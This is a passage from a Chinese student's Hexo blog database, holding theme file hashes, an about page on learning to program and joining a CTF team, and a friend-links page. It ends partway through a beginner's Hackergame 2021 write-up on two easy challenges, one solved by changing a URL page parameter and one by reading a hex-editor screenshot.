47c0f278857f18f0","modified":1659501585000},{"_id":"themes\\icarus\\source\\js\\back_to_top.js","hash":"d91f10c08c726135a13dfa1f422c49d8764ef03f","modified":1659501585000},{"_id":"themes\\icarus\\source\\js\\main.js","hash":"37f3b16fbd9668b9496d5f2d9bd9fb22fc6cee27","modified":1717465057000},{"_id":"themes\\icarus\\include\\schema\\common\\article.json","hash":"e2502c39045c6a26ccd8e880858f93e78c7bda35","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\common\\comment.json","hash":"265120b80df9808358df3ff7c4eada8a66512a4b","modified":1717465057000},{"_id":"themes\\icarus\\include\\schema\\common\\donates.json","hash":"ae86e6f177bedf4afbe638502c12635027539305","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\common\\footer.json","hash":"e85c9d7f2579805beb252a1b6345d5a668a13baa","modified":1717465057000},{"_id":"themes\\icarus\\include\\schema\\common\\head.json","hash":"98889f059c635e6bdbd51effd04cf1cf44968a66","modified":1659501585000},{"_id":"themes\\icarus\\source\\js\\animation.js","hash":"0a8e361c353daa3194f4de3d646b96025d128e1a","modified":1717465057000},{"_id":"themes\\icarus\\include\\schema\\common\\plugins.json","hash":"04c0738dc0a3ed89aecae2aee4ab60173f09e66b","modified":1717465057000},{"_id":"themes\\icarus\\include\\schema\\common\\providers.json","hash":"97ec953d497fb53594227ae98acaef8a8baa91da","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\common\\share.json","hash":"cf4f9ff4fb27c3541b35f57db355c228fa6873e4","modified":1659501585000},{"_id":"themes\\icarus\\source\\img\\og_image.png","hash":"b03f163096ca9c350ec962feee9836277b5c2509","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\common\\navbar.json","hash":"6691e587284c4cf450e0288680d5ff0f3565f090","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\common\\sidebar.json","hash":"eb241beaec4c73e3085dfb3139ce72e827e20549","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\common\\widgets.json","hash":"cadd9dc942740ecd5037d3943e72f8b6a8399bbe","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\common\\search.json","hash":"985fbcbf47054af714ead1a124869d54f2a8b607","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\plugin\\animejs.json","hash":"e62ab6e20bd8862efa1ed32e7c0db0f8acbcfdec","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\plugin\\back_to_top.json","hash":"dc0febab7e7b67075d0ad3f80f5ec8b798b68dea","modified":1659501585000},{"_id":"themes\\icarus\\include\\schema\\widget\\profile.json","hash":"690ee1b0791cab47ea03cf42b5b4932ed2aa5675","modified":1659501585000},{"_id":"source\\images\\wy.png","hash":"b3f6de267f44933e5d352936ee8ae48ed3063cea","modified":1402728072000},{"_id":"themes\\icarus\\include\\migration\\v5_v5.1.js","hash":"073f22bd16e34b56f016633b1676dab2e7d8843d","modified":1717465057000},{"_id":"themes\\icarus\\layout\\plugin\\pjax.jsx","hash":"65956102d5faabcedaaafb14b0201548f15e60ce","modified":1717465057000},{"_id":"themes\\icarus\\include\\schema\\plugin\\pjax.json","hash":"1f6218016569eb9cd354a06a9537c7110efb5f17","modified":1717465057000},{"_id":"themes\\icarus\\languages\\it.yml","hash":"b76999994cda6b08b53d34c3dd67947f164de655","modified":1717465057000},{"_id":"themes\\icarus\\languages\\sv.yml","hash":"b12eee168c52aac855ffce9f78fe5fd5d6e3970c","modified":1717465057000},{"_id":"themes\\icarus\\source\\js\\pjax.js","hash":"b41aa64aa965201740505376bcebbdedf607a2d4","modified":1717465057000}],"Category":[{"name":"题解","_id":"cl8wgppor0004ck6g8sj96dqx"},{"name":"学习","_id":"cl8wgppp5000nck6gb6tjd2ny"},{"name":"环境搭建","_id":"cl8wgppp90011ck6g0qo4eyyg"},{"name":"小项目","_id":"cl8wgpppe001lck6g1xnsczld"},{"name":"C语言","_id":"cl8wgpppf001sck6ghdo2gupw"},{"name":"小玩意","_id":"cl8wgpppg001wck6gdzdw751v"},{"name":"数学","_id":"cl8wgpppg001zck6ga5cpegfa"},{"name":"渗透","_id":"clxa5zodb000n7slz1s77hx14"},{"name":"生活","_id":"clxa5zodr001m7slzf29pcpge"}],"Data":[],"Page":[{"title":"categories","date":"2022-01-01T11:13:10.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2022-01-01 19:13:10\ntype: categories\n---\n","updated":"2022-01-01T11:13:25.522Z","path":"categories/index.html","_id":"cl8wgppol0000ck6gdg98bb41","comments":1,"layout":"page","content":"","excerpt":"","more":""},{"title":"关于","date":"2022-03-08T16:38:00.000Z","type":"about","_content":"\n********************************\n> 因为淋过雨，所以想给别人撑伞。\n\n## Team\n\nMember of W4terDr0p / S1uM4i / 1997.\n\n## 成长历程\n\n### 初见\n\n故事得从我初一的时候说起，当时年轻气盛，在 QQ 建了一个级群，里面各种鱼龙混杂，机缘巧合之下，有人在群里发了一个安卓 AIDE 开发群的二维码，我进去后也跟着下了一个玩，迷迷糊糊写了个 HelloWorld ，算是初步踏入了编程之路。\n\n### 走马观花\n\n到初二的时候，我一个同班同学开始带着我研究计算机。毕竟他是跟电脑从小玩到大的，会很多东西，比如会视频剪辑，精通 Office（是真的精通），而且也会用虚拟机破解 WIFI 密码，知道 Windows 系统的很多东西，其他还有 OCR 等很杂的，我现在大都忘了，但仍很清楚地记得他带我写了几个 vb 程序。从那以后，我开始知道了程序设计的基本结构（比如 if-else ），也算是正式开始编程了。\n\n临近生地中考的时候，我借着打印复习资料的由头（虽然现在回想起来有点离谱）成功劝服家里买了第一台电脑。买之前我是和我同学研究了许久的，以至于我现在仍清楚地记得最初的配置——CPU 是英特尔的 i5-7500，内存条 8G ，2400Hz ，金士顿的，硬盘买了希捷的 2T 机械硬盘，其他不提。后来断断续续又补了两个固态作主盘，加了张显卡和内存条，也撑了 5 年直到现在没出过什么毛病。\n\n总之，从初二开始，我便开始广泛地接触到计算机的许多方面了，诸如 Office、AE 等软件大概鼓捣过，用 vb.net 写（Ctrl+C & Ctrl+V）了几个窗体应用程序，但也仅此而已。\n\n### 登堂入室\n\n高考结束后，我开始研究起写网站，毕竟想搞这个很久了，几经摸索，我在阿里云租了一个轻量级应用服务器（新人优惠，一年也就 99 元，不算很贵），然后就是各种百度了。\n\n建站的过程非常艰辛，或许是我对搜索引擎的使用不够熟练，我查了很多资料，但很多都是在本地部署网络服务，或是 WordPress 的搭建教程，而我是想写一个空白的页面（或者说是不依赖于框架运行的），又折腾许久，在 WordPress 的应用镜像下更换了目录下的文件，勉强可以实现。再后来又换了 LNMP 的应用镜像，直到几个月后 GZTime 学长告诉我有个东西叫宝塔，我才发现都白忙活了。。。\n\n在七月末的时候，我开始在 B 站看 C 语言的视频，2 倍速每天看五个钟连着五天把 1500 分钟的视频刷完了，才算是真正开始入门编程。\n\n八月初，花了将近 10 天细细啃读了一遍高一就买了的《x86 汇编————从实模式到保护模式》，然而看完实模式已经晕了，就没有再看了。\n\n至此，计算机底层的基础就打下来一点了。\n\n### 找到组织\n\n在入学之后进了一个学校里的计算机吹水群（bushi），某一天，我在上面看见一个社团招新公告，上面附有一个解谜游戏的链接，国庆在家无聊就玩了起来，~~从此踏上了 CTF 的不归路，~~ 也因此结识了 GZTime 学长————可以说是我计算机方面真正的领路人，教会了我很多东西。同时也遇到了 tel 、大菠萝、yescallop、Hanmur 等志同道合的伙伴，还进了学校的计算机社团和 CTF 战队。\n\n如果上天再给我一次填报高考志愿的机会，我想我还是会作出同样的选择，与学校本身无关，只因我舍不得我的这些朋友。也只有在与他们水群和打比赛的时候，我才能忘却内卷与一切烦恼。\n\n### 彼岸\n\n不论如何，我今后仍旧会坚持自己的热爱，与同道一齐，追寻梦想。愿与诸君共勉，在网络空间上做些贡献，也算不枉一身所学。\n\n## 我现在在干什么\n\n玩 CTF、学算法、学数学\n以及写一些没什么基础也能看懂的文章，谨以此记念我曾经在搜索引擎上摸爬滚打的经历。\n","source":"about/index.md","raw":"---\ntitle: 关于\ndate: 2022-03-09 00:38:00\ntype: \"about\"\n---\n\n********************************\n> 因为淋过雨，所以想给别人撑伞。\n\n## Team\n\nMember of W4terDr0p / S1uM4i / 1997.\n\n## 成长历程\n\n### 初见\n\n故事得从我初一的时候说起，当时年轻气盛，在 QQ 建了一个级群，里面各种鱼龙混杂，机缘巧合之下，有人在群里发了一个安卓 AIDE 开发群的二维码，我进去后也跟着下了一个玩，迷迷糊糊写了个 HelloWorld ，算是初步踏入了编程之路。\n\n### 走马观花\n\n到初二的时候，我一个同班同学开始带着我研究计算机。毕竟他是跟电脑从小玩到大的，会很多东西，比如会视频剪辑，精通 Office（是真的精通），而且也会用虚拟机破解 WIFI 密码，知道 Windows 系统的很多东西，其他还有 OCR 等很杂的，我现在大都忘了，但仍很清楚地记得他带我写了几个 vb 程序。从那以后，我开始知道了程序设计的基本结构（比如 if-else ），也算是正式开始编程了。\n\n临近生地中考的时候，我借着打印复习资料的由头（虽然现在回想起来有点离谱）成功劝服家里买了第一台电脑。买之前我是和我同学研究了许久的，以至于我现在仍清楚地记得最初的配置——CPU 是英特尔的 i5-7500，内存条 8G ，2400Hz ，金士顿的，硬盘买了希捷的 2T 机械硬盘，其他不提。后来断断续续又补了两个固态作主盘，加了张显卡和内存条，也撑了 5 年直到现在没出过什么毛病。\n\n总之，从初二开始，我便开始广泛地接触到计算机的许多方面了，诸如 Office、AE 等软件大概鼓捣过，用 vb.net 写（Ctrl+C & Ctrl+V）了几个窗体应用程序，但也仅此而已。\n\n### 登堂入室\n\n高考结束后，我开始研究起写网站，毕竟想搞这个很久了，几经摸索，我在阿里云租了一个轻量级应用服务器（新人优惠，一年也就 99 元，不算很贵），然后就是各种百度了。\n\n建站的过程非常艰辛，或许是我对搜索引擎的使用不够熟练，我查了很多资料，但很多都是在本地部署网络服务，或是 WordPress 的搭建教程，而我是想写一个空白的页面（或者说是不依赖于框架运行的），又折腾许久，在 WordPress 的应用镜像下更换了目录下的文件，勉强可以实现。再后来又换了 LNMP 的应用镜像，直到几个月后 GZTime 学长告诉我有个东西叫宝塔，我才发现都白忙活了。。。\n\n在七月末的时候，我开始在 B 站看 C 语言的视频，2 倍速每天看五个钟连着五天把 1500 分钟的视频刷完了，才算是真正开始入门编程。\n\n八月初，花了将近 10 天细细啃读了一遍高一就买了的《x86 汇编————从实模式到保护模式》，然而看完实模式已经晕了，就没有再看了。\n\n至此，计算机底层的基础就打下来一点了。\n\n### 找到组织\n\n在入学之后进了一个学校里的计算机吹水群（bushi），某一天，我在上面看见一个社团招新公告，上面附有一个解谜游戏的链接，国庆在家无聊就玩了起来，~~从此踏上了 CTF 的不归路，~~ 也因此结识了 GZTime 学长————可以说是我计算机方面真正的领路人，教会了我很多东西。同时也遇到了 tel 、大菠萝、yescallop、Hanmur 等志同道合的伙伴，还进了学校的计算机社团和 CTF 战队。\n\n如果上天再给我一次填报高考志愿的机会，我想我还是会作出同样的选择，与学校本身无关，只因我舍不得我的这些朋友。也只有在与他们水群和打比赛的时候，我才能忘却内卷与一切烦恼。\n\n### 彼岸\n\n不论如何，我今后仍旧会坚持自己的热爱，与同道一齐，追寻梦想。愿与诸君共勉，在网络空间上做些贡献，也算不枉一身所学。\n\n## 我现在在干什么\n\n玩 CTF、学算法、学数学\n以及写一些没什么基础也能看懂的文章，谨以此记念我曾经在搜索引擎上摸爬滚打的经历。\n","updated":"2024-06-03T06:16:19.756Z","path":"about/index.html","_id":"cl8wgppoq0002ck6g2i2d30by","comments":1,"layout":"page","content":"<hr>\n<blockquote>\n<p>因为淋过雨，所以想给别人撑伞。</p>\n</blockquote>\n<h2 id=\"Team\"><a href=\"#Team\" class=\"headerlink\" title=\"Team\"></a>Team</h2><p>Member of W4terDr0p / S1uM4i / 1997.</p>\n<h2 id=\"成长历程\"><a href=\"#成长历程\" class=\"headerlink\" title=\"成长历程\"></a>成长历程</h2><h3 id=\"初见\"><a href=\"#初见\" class=\"headerlink\" title=\"初见\"></a>初见</h3><p>故事得从我初一的时候说起，当时年轻气盛，在 QQ 建了一个级群，里面各种鱼龙混杂，机缘巧合之下，有人在群里发了一个安卓 AIDE 开发群的二维码，我进去后也跟着下了一个玩，迷迷糊糊写了个 HelloWorld ，算是初步踏入了编程之路。</p>\n<h3 id=\"走马观花\"><a href=\"#走马观花\" class=\"headerlink\" title=\"走马观花\"></a>走马观花</h3><p>到初二的时候，我一个同班同学开始带着我研究计算机。毕竟他是跟电脑从小玩到大的，会很多东西，比如会视频剪辑，精通 Office（是真的精通），而且也会用虚拟机破解 WIFI 密码，知道 Windows 系统的很多东西，其他还有 OCR 等很杂的，我现在大都忘了，但仍很清楚地记得他带我写了几个 vb 程序。从那以后，我开始知道了程序设计的基本结构（比如 if-else ），也算是正式开始编程了。</p>\n<p>临近生地中考的时候，我借着打印复习资料的由头（虽然现在回想起来有点离谱）成功劝服家里买了第一台电脑。买之前我是和我同学研究了许久的，以至于我现在仍清楚地记得最初的配置——CPU 是英特尔的 i5-7500，内存条 8G ，2400Hz ，金士顿的，硬盘买了希捷的 2T 机械硬盘，其他不提。后来断断续续又补了两个固态作主盘，加了张显卡和内存条，也撑了 5 年直到现在没出过什么毛病。</p>\n<p>总之，从初二开始，我便开始广泛地接触到计算机的许多方面了，诸如 Office、AE 等软件大概鼓捣过，用 vb.net 写（Ctrl+C &amp; Ctrl+V）了几个窗体应用程序，但也仅此而已。</p>\n<h3 id=\"登堂入室\"><a href=\"#登堂入室\" class=\"headerlink\" title=\"登堂入室\"></a>登堂入室</h3><p>高考结束后，我开始研究起写网站，毕竟想搞这个很久了，几经摸索，我在阿里云租了一个轻量级应用服务器（新人优惠，一年也就 99 元，不算很贵），然后就是各种百度了。</p>\n<p>建站的过程非常艰辛，或许是我对搜索引擎的使用不够熟练，我查了很多资料，但很多都是在本地部署网络服务，或是 WordPress 的搭建教程，而我是想写一个空白的页面（或者说是不依赖于框架运行的），又折腾许久，在 WordPress 的应用镜像下更换了目录下的文件，勉强可以实现。再后来又换了 LNMP 的应用镜像，直到几个月后 GZTime 学长告诉我有个东西叫宝塔，我才发现都白忙活了。。。</p>\n<p>在七月末的时候，我开始在 B 站看 C 语言的视频，2 倍速每天看五个钟连着五天把 1500 分钟的视频刷完了，才算是真正开始入门编程。</p>\n<p>八月初，花了将近 10 天细细啃读了一遍高一就买了的《x86 汇编————从实模式到保护模式》，然而看完实模式已经晕了，就没有再看了。</p>\n<p>至此，计算机底层的基础就打下来一点了。</p>\n<h3 id=\"找到组织\"><a href=\"#找到组织\" class=\"headerlink\" title=\"找到组织\"></a>找到组织</h3><p>在入学之后进了一个学校里的计算机吹水群（bushi），某一天，我在上面看见一个社团招新公告，上面附有一个解谜游戏的链接，国庆在家无聊就玩了起来，<del>从此踏上了 CTF 的不归路，</del> 也因此结识了 GZTime 学长————可以说是我计算机方面真正的领路人，教会了我很多东西。同时也遇到了 tel 、大菠萝、yescallop、Hanmur 等志同道合的伙伴，还进了学校的计算机社团和 CTF 战队。</p>\n<p>如果上天再给我一次填报高考志愿的机会，我想我还是会作出同样的选择，与学校本身无关，只因我舍不得我的这些朋友。也只有在与他们水群和打比赛的时候，我才能忘却内卷与一切烦恼。</p>\n<h3 id=\"彼岸\"><a href=\"#彼岸\" class=\"headerlink\" title=\"彼岸\"></a>彼岸</h3><p>不论如何，我今后仍旧会坚持自己的热爱，与同道一齐，追寻梦想。愿与诸君共勉，在网络空间上做些贡献，也算不枉一身所学。</p>\n<h2 id=\"我现在在干什么\"><a href=\"#我现在在干什么\" class=\"headerlink\" title=\"我现在在干什么\"></a>我现在在干什么</h2><p>玩 CTF、学算法、学数学<br>以及写一些没什么基础也能看懂的文章，谨以此记念我曾经在搜索引擎上摸爬滚打的经历。</p>\n","excerpt":"","more":"<hr>\n<blockquote>\n<p>因为淋过雨，所以想给别人撑伞。</p>\n</blockquote>\n<h2 id=\"Team\"><a href=\"#Team\" class=\"headerlink\" title=\"Team\"></a>Team</h2><p>Member of W4terDr0p / S1uM4i / 1997.</p>\n<h2 id=\"成长历程\"><a href=\"#成长历程\" class=\"headerlink\" title=\"成长历程\"></a>成长历程</h2><h3 id=\"初见\"><a href=\"#初见\" class=\"headerlink\" title=\"初见\"></a>初见</h3><p>故事得从我初一的时候说起，当时年轻气盛，在 QQ 建了一个级群，里面各种鱼龙混杂，机缘巧合之下，有人在群里发了一个安卓 AIDE 开发群的二维码，我进去后也跟着下了一个玩，迷迷糊糊写了个 HelloWorld ，算是初步踏入了编程之路。</p>\n<h3 id=\"走马观花\"><a href=\"#走马观花\" class=\"headerlink\" title=\"走马观花\"></a>走马观花</h3><p>到初二的时候，我一个同班同学开始带着我研究计算机。毕竟他是跟电脑从小玩到大的，会很多东西，比如会视频剪辑，精通 Office（是真的精通），而且也会用虚拟机破解 WIFI 密码，知道 Windows 系统的很多东西，其他还有 OCR 等很杂的，我现在大都忘了，但仍很清楚地记得他带我写了几个 vb 程序。从那以后，我开始知道了程序设计的基本结构（比如 if-else ），也算是正式开始编程了。</p>\n<p>临近生地中考的时候，我借着打印复习资料的由头（虽然现在回想起来有点离谱）成功劝服家里买了第一台电脑。买之前我是和我同学研究了许久的，以至于我现在仍清楚地记得最初的配置——CPU 是英特尔的 i5-7500，内存条 8G ，2400Hz ，金士顿的，硬盘买了希捷的 2T 机械硬盘，其他不提。后来断断续续又补了两个固态作主盘，加了张显卡和内存条，也撑了 5 年直到现在没出过什么毛病。</p>\n<p>总之，从初二开始，我便开始广泛地接触到计算机的许多方面了，诸如 Office、AE 等软件大概鼓捣过，用 vb.net 写（Ctrl+C &amp; Ctrl+V）了几个窗体应用程序，但也仅此而已。</p>\n<h3 id=\"登堂入室\"><a href=\"#登堂入室\" class=\"headerlink\" title=\"登堂入室\"></a>登堂入室</h3><p>高考结束后，我开始研究起写网站，毕竟想搞这个很久了，几经摸索，我在阿里云租了一个轻量级应用服务器（新人优惠，一年也就 99 元，不算很贵），然后就是各种百度了。</p>\n<p>建站的过程非常艰辛，或许是我对搜索引擎的使用不够熟练，我查了很多资料，但很多都是在本地部署网络服务，或是 WordPress 的搭建教程，而我是想写一个空白的页面（或者说是不依赖于框架运行的），又折腾许久，在 WordPress 的应用镜像下更换了目录下的文件，勉强可以实现。再后来又换了 LNMP 的应用镜像，直到几个月后 GZTime 学长告诉我有个东西叫宝塔，我才发现都白忙活了。。。</p>\n<p>在七月末的时候，我开始在 B 站看 C 语言的视频，2 倍速每天看五个钟连着五天把 1500 分钟的视频刷完了，才算是真正开始入门编程。</p>\n<p>八月初，花了将近 10 天细细啃读了一遍高一就买了的《x86 汇编————从实模式到保护模式》，然而看完实模式已经晕了，就没有再看了。</p>\n<p>至此，计算机底层的基础就打下来一点了。</p>\n<h3 id=\"找到组织\"><a href=\"#找到组织\" class=\"headerlink\" title=\"找到组织\"></a>找到组织</h3><p>在入学之后进了一个学校里的计算机吹水群（bushi），某一天，我在上面看见一个社团招新公告，上面附有一个解谜游戏的链接，国庆在家无聊就玩了起来，<del>从此踏上了 CTF 的不归路，</del> 也因此结识了 GZTime 学长————可以说是我计算机方面真正的领路人，教会了我很多东西。同时也遇到了 tel 、大菠萝、yescallop、Hanmur 等志同道合的伙伴，还进了学校的计算机社团和 CTF 战队。</p>\n<p>如果上天再给我一次填报高考志愿的机会，我想我还是会作出同样的选择，与学校本身无关，只因我舍不得我的这些朋友。也只有在与他们水群和打比赛的时候，我才能忘却内卷与一切烦恼。</p>\n<h3 id=\"彼岸\"><a href=\"#彼岸\" class=\"headerlink\" title=\"彼岸\"></a>彼岸</h3><p>不论如何，我今后仍旧会坚持自己的热爱，与同道一齐，追寻梦想。愿与诸君共勉，在网络空间上做些贡献，也算不枉一身所学。</p>\n<h2 id=\"我现在在干什么\"><a href=\"#我现在在干什么\" class=\"headerlink\" title=\"我现在在干什么\"></a>我现在在干什么</h2><p>玩 CTF、学算法、学数学<br>以及写一些没什么基础也能看懂的文章，谨以此记念我曾经在搜索引擎上摸爬滚打的经历。</p>\n"},{"title":"友链","date":"2021-12-31T08:57:00.000Z","_content":"\n********************************\n\n## DaLaos\n\n[GZTime](https://blog.gztime.cc/) Walking on the Time Axis.\n\n[小傅Fox](https://xfox.me/) 一个博客不写技术的 dalao\n\n[Darkyzhou](https://darkyzhou.net) MC 爱好者\n\n[jiahonzheng](https://blog.jiahonzheng.com) 请叫他 ++\n\n[春哥](https://www.zhihu.com/people/ZM_________J) 一人攻沙虐全场\n\n## 朋友们\n\n[Hanmur](https://hanmur.cn) 一位帅气且有趣的学长\n\n[yescallop](https://yescallop.cn) Rust 水平相当高\n\n[FluoriteFire](https://fluoritefire.github.io) Walking to a new world\n\n[Tel](https://l1nyz-tel.cc) where are you\n\n[a39](http://www.asuka39.top) 歩いても、歩いても\n\n[Elapsedf](https://elapsedf.cn) Think what you want\n\n[Pazuris](https://pazuris.cn) Fear neither hardship nor darkness\n\n[yring](https://yring-me.com) 冥冥之中 自有天意\n\n********************************\n\n> 欢迎来交换友链ヾ(≧▽≦*)o\n\n```yaml\n- name: weyung\n  link: https://blog.weyung.cc\n  avatar: https://blog.weyung.cc/images/wy.png\n  descr: 写一些和我一样菜也能看懂的文章\n```\n","source":"links/index.md","raw":"---\ntitle: 友链\ndate: 2021-12-31 16:57:00\n---\n\n********************************\n\n## DaLaos\n\n[GZTime](https://blog.gztime.cc/) Walking on the Time Axis.\n\n[小傅Fox](https://xfox.me/) 一个博客不写技术的 dalao\n\n[Darkyzhou](https://darkyzhou.net) MC 爱好者\n\n[jiahonzheng](https://blog.jiahonzheng.com) 请叫他 ++\n\n[春哥](https://www.zhihu.com/people/ZM_________J) 一人攻沙虐全场\n\n## 朋友们\n\n[Hanmur](https://hanmur.cn) 一位帅气且有趣的学长\n\n[yescallop](https://yescallop.cn) Rust 水平相当高\n\n[FluoriteFire](https://fluoritefire.github.io) Walking to a new world\n\n[Tel](https://l1nyz-tel.cc) where are you\n\n[a39](http://www.asuka39.top) 歩いても、歩いても\n\n[Elapsedf](https://elapsedf.cn) Think what you want\n\n[Pazuris](https://pazuris.cn) Fear neither hardship nor darkness\n\n[yring](https://yring-me.com) 冥冥之中 自有天意\n\n********************************\n\n> 欢迎来交换友链ヾ(≧▽≦*)o\n\n```yaml\n- name: weyung\n  link: https://blog.weyung.cc\n  avatar: https://blog.weyung.cc/images/wy.png\n  descr: 写一些和我一样菜也能看懂的文章\n```\n","updated":"2024-05-15T05:15:00.026Z","path":"links/index.html","_id":"cl8wgppot0006ck6g2bfsh9wd","comments":1,"layout":"page","content":"<hr>\n<h2 id=\"DaLaos\"><a href=\"#DaLaos\" class=\"headerlink\" title=\"DaLaos\"></a>DaLaos</h2><p><a href=\"https://blog.gztime.cc/\">GZTime</a> Walking on the Time Axis.</p>\n<p><a href=\"https://xfox.me/\">小傅Fox</a> 一个博客不写技术的 dalao</p>\n<p><a href=\"https://darkyzhou.net/\">Darkyzhou</a> MC 爱好者</p>\n<p><a href=\"https://blog.jiahonzheng.com/\">jiahonzheng</a> 请叫他 ++</p>\n<p><a href=\"https://www.zhihu.com/people/ZM_________J\">春哥</a> 一人攻沙虐全场</p>\n<h2 id=\"朋友们\"><a href=\"#朋友们\" class=\"headerlink\" title=\"朋友们\"></a>朋友们</h2><p><a href=\"https://hanmur.cn/\">Hanmur</a> 一位帅气且有趣的学长</p>\n<p><a href=\"https://yescallop.cn/\">yescallop</a> Rust 水平相当高</p>\n<p><a href=\"https://fluoritefire.github.io/\">FluoriteFire</a> Walking to a new world</p>\n<p><a href=\"https://l1nyz-tel.cc/\">Tel</a> where are you</p>\n<p><a href=\"http://www.asuka39.top/\">a39</a> 歩いても、歩いても</p>\n<p><a href=\"https://elapsedf.cn/\">Elapsedf</a> Think what you want</p>\n<p><a href=\"https://pazuris.cn/\">Pazuris</a> Fear neither hardship nor darkness</p>\n<p><a href=\"https://yring-me.com/\">yring</a> 冥冥之中 自有天意</p>\n<hr>\n<blockquote>\n<p>欢迎来交换友链ヾ(≧▽≦*)o</p>\n</blockquote>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">weyung</span></span><br><span class=\"line\">  <span class=\"attr\">link:</span> <span class=\"string\">https://blog.weyung.cc</span></span><br><span class=\"line\">  <span class=\"attr\">avatar:</span> <span class=\"string\">https://blog.weyung.cc/images/wy.png</span></span><br><span class=\"line\">  <span class=\"attr\">descr:</span> <span class=\"string\">写一些和我一样菜也能看懂的文章</span></span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<hr>\n<h2 id=\"DaLaos\"><a href=\"#DaLaos\" class=\"headerlink\" title=\"DaLaos\"></a>DaLaos</h2><p><a href=\"https://blog.gztime.cc/\">GZTime</a> Walking on the Time Axis.</p>\n<p><a href=\"https://xfox.me/\">小傅Fox</a> 一个博客不写技术的 dalao</p>\n<p><a href=\"https://darkyzhou.net/\">Darkyzhou</a> MC 爱好者</p>\n<p><a href=\"https://blog.jiahonzheng.com/\">jiahonzheng</a> 请叫他 ++</p>\n<p><a href=\"https://www.zhihu.com/people/ZM_________J\">春哥</a> 一人攻沙虐全场</p>\n<h2 id=\"朋友们\"><a href=\"#朋友们\" class=\"headerlink\" title=\"朋友们\"></a>朋友们</h2><p><a href=\"https://hanmur.cn/\">Hanmur</a> 一位帅气且有趣的学长</p>\n<p><a href=\"https://yescallop.cn/\">yescallop</a> Rust 水平相当高</p>\n<p><a href=\"https://fluoritefire.github.io/\">FluoriteFire</a> Walking to a new world</p>\n<p><a href=\"https://l1nyz-tel.cc/\">Tel</a> where are you</p>\n<p><a href=\"http://www.asuka39.top/\">a39</a> 歩いても、歩いても</p>\n<p><a href=\"https://elapsedf.cn/\">Elapsedf</a> Think what you want</p>\n<p><a href=\"https://pazuris.cn/\">Pazuris</a> Fear neither hardship nor darkness</p>\n<p><a href=\"https://yring-me.com/\">yring</a> 冥冥之中 自有天意</p>\n<hr>\n<blockquote>\n<p>欢迎来交换友链ヾ(≧▽≦*)o</p>\n</blockquote>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">weyung</span></span><br><span class=\"line\">  <span class=\"attr\">link:</span> <span class=\"string\">https://blog.weyung.cc</span></span><br><span class=\"line\">  <span class=\"attr\">avatar:</span> <span class=\"string\">https://blog.weyung.cc/images/wy.png</span></span><br><span class=\"line\">  <span class=\"attr\">descr:</span> <span class=\"string\">写一些和我一样菜也能看懂的文章</span></span><br></pre></td></tr></table></figure>\n"},{"title":"标签","date":"2021-12-23T02:17:15.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2021-12-23 10:17:15\ntype: \"tags\"\n---\n","updated":"2021-12-31T08:57:57.545Z","path":"tags/index.html","_id":"cl8wgppou0008ck6gde4k0lw9","comments":1,"layout":"page","content":"","excerpt":"","more":""}],"Post":[{"title":"Hackergame 2021 writeups","date":"2021-11-05T04:00:00.000Z","_content":"\n第一次打CTF比赛\n<!--more-->\n## Summary\n\n作为新手，第一次参加 CTF ，题目比 MSClub 的招新 puzzle 难得多，但是也好玩得多，前两天有幸短暂地在总榜停留过（或者只是第一天？忘了），最终组内排名第四（因为校内的大佬不在）（ GZTime tql ，凌晨肝神冲到总榜第四orz，此处附上 [wp 传送门](https://blog.gztime.cc/posts/2021/9f04efbd/)）。比赛的题目出得都非常得有趣 ~~（除了透明的文件）~~，对新手来说体验确实不错，也确实是名副其实的 pythongame（零基础强行入门），做到灯那题的时候我面对线性非齐次方程组的无穷多解毫无头绪，这彻底燃起了我学线代的激情（嗯，有意思），最后我交的第一个错误的 flag 上了花絮也有小小的惊喜（没错我确实是有备而来 hiahiahia）。总体体验良好，明年再来。下面是我做出的几题的 wp，内容较水，可酌情移步至[神（mcfx）的 wp](https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/)。\n\n********************************\n\n## 签到\n\n> 为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！\n\n很简单的 web 题，注意到网址栏的后面的`?page=<当面的数字>`，直接修改，疯狂加 0，然后二分法试探，最终在 `?page=1635000000` 的时候到达当前时间，出 flag (后来才知道这是时间戳)。\n\n## 进制十六——参上\n\n> 为严防 flag 泄漏以及其他存在于未来所有可能的意外灾难，神通广大的 Z 同学不仅强制要求每一道题目都加上权限和资源的限制，还给所有参与 Hackergame 2021 命题的计算机施加了一层法术结界。任何试图从结界逃逸的 flag 都会被无情抹除。\n>\n>而一位明面上是计算机学院的新生，实则为物理学院暗部核心成员的 X 同学，在 Hackergame 2021 命题组已经潜伏多时。妄想趁比赛开始的午时，借阳火正旺之势，冲破 Z 同学的结界，以图片而非明文的形式，将 flag 悄悄传递出来。\n>\n>好在 Z 同学法力之深厚，不可管窥蠡测。在 flag 被传出去的前两天，就已预知此事并将图片中的 flag 无声消泯了。\n>\n>只是，这位 X 同学，虽然不会退出 Vim，但是似乎对打开十六进制编辑器颇有造诣……\n\n![Hex](https://hack.lug.ustc.edu.cn/media/629da242-b1b1-5f69-a623-1c13fcedf019/hex_editor.png)\n\n同样是很简单的题目，随便找个十六进制编辑器照着抄下然后得出右边的 flag 